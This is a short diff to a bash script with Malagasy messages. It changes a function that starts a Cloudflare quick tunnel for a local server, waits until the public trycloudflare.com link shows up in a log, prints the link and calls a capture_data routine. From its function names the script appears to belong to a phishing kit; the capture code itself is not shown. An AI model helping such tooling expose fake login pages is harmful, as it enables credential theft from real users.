@@ -281,14 +281,28 @@ start_ngrok() {
     capture_data
 }
 
+
 start_cloudflared() {
     cusport
     echo -e "${RED}[${WHITE}-${RED}]${GREEN} Alefa i Cloudflared..."
     setup_site
-    sleep 2 && ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-    sleep 4; clear; banner_small
-    cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .server/.cld.log)
-    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Rohy (URL) : ${GREEN}${cldflr_link:-https://cloudflare.com}"
+    
+    # Mandefa an'i cloudflared any ambadika (background)
+    ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+    
+    echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Andrasana kely ny famoronana ny rohy..."
+    
+    # Manao boucle miandry mandra-pahitana ilay rohy ao anaty log
+    cldflr_link=""
+    while [ -z "$cldflr_link" ]; do
+        sleep 2
+        if [ -f .server/.cld.log ]; then
+            cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .server/.cld.log | head -n 1)
+        fi
+    done
+    
+    clear; banner_small
+    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Rohy (URL) : ${GREEN}${cldflr_link}"
     capture_data
 }
 
